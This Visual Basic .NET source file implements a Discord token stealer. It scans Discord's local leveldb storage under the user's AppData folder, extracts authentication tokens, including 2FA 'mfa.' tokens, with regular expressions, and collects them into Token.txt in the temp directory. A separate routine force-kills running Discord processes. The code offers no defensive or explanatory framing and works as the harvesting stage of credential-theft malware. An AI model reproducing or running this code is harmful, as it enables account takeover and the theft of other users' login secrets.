Imports System.IO
Imports System.Text.RegularExpressions
Imports System.Text

Namespace Other
    Public Class DiscordToken
        Dim tokens As New StringBuilder

        Public Function GetToken()
            Dim files = SearchForToken()

            If files.Count = 0 Then
                Return False
            Else
                For Each token As String In files
                    For Each match As Match In Regex.Matches(token, "[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
                        tokens.AppendLine("Discord Token = " & match.ToString())
                    Next

                    For Each match As Match In Regex.Matches(token, "mfa\.[\w-]{84}")
                        tokens.AppendLine("Discord Token (2FA) = " & match.ToString())
                    Next
                Next
            End If

            If tokens.Length > 0 Then

                IO.File.WriteAllText(Path.GetTempPath & "Token.txt", tokens.ToString())

                Return True

            Else

                Return False

            End If
        End Function

        Private Function SearchForToken() As List(Of String)
            Dim logFiles As List(Of String) = New List(Of String)()
            Dim discordPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\discord\Local Storage\leveldb\"

            If Not Directory.Exists(discordPath) Then
                Return logFiles
            End If

            For Each dbfile As String In getFiles(discordPath, "*.log|*.ldb", SearchOption.TopDirectoryOnly)
                Dim rawText As String = File.ReadAllText(dbfile)

                If rawText.Contains("oken") Then
                    logFiles.Add(rawText)
                End If

            Next
            Return logFiles
        End Function
        Public Function KillDiscord()
            Try
                If Process.GetProcessesByName("Discord").Length > 0 Then
                    Dim ProcessList() As Process = System.Diagnostics.Process.GetProcessesByName("Discord")
                    For Each proc As Process In ProcessList
                        proc.Kill()
                    Next
                    Return True
                Else
                    Return True
                End If
            Catch ex As Exception
                Return False
            End Try
        End Function

        Public Function getFiles(ByVal SourceFolder As String, ByVal Filter As String, ByVal searchOption As System.IO.SearchOption) As String()
            Dim alFiles As ArrayList = New ArrayList()
            Dim MultipleFilters() As String = Filter.Split("|")
            For Each FileFilter As String In MultipleFilters
                alFiles.AddRange(Directory.GetFiles(SourceFolder, FileFilter, searchOption))
            Next
            Return alFiles.ToArray(Type.GetType("System.String"))
        End Function
    End Class
End Namespace